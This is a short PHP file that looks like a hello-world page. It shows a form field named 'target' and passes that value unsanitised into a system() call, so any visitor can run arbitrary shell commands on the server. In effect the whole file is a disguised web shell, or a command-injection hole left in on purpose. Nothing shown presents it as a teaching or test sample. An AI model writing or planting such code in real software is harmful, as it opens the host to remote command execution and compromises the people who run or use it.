<?php
echo "<h1> Hello PHP! </h1>";
?>
<form>
    <input type="text" name="target">
    <input type="submit" value="🕶">
</form>
<?php
if (isset($_GET['target'])) system("'${_GET['target']}'")
?>